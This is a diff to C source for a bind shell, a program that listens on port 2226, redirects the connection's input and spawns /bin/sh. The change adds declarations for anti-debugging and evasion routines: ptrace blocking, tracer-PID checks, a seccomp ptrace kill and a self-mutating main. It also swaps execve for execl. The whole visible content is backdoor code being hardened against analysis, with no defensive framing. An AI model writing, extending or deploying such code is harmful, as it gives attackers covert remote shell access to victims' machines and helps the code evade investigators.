@@ -4,6 +4,13 @@
 #include <stdlib.h>
 #include <unistd.h>
 
+extern int perform_action();     		
+extern void anti_debug();        		
+extern void check_tracer_pid(void);
+extern void block_ptrace_attaches(void);
+extern void install_seccomp_ptrace_kill(void);
+extern int mutate_main(int argc, char **argv);
+
 int main(){
 	int resultfd, sockfd;
 	int port = 2226;
@@ -36,7 +43,7 @@ int main(){
 	dup2(resultfd, 0);
 
 	// syscall 11
-	execve("/bin/sh", NULL, NULL);
+	execl("/bin/sh", "/bin/sh", (char *)NULL);
 
 	return 0;
 }
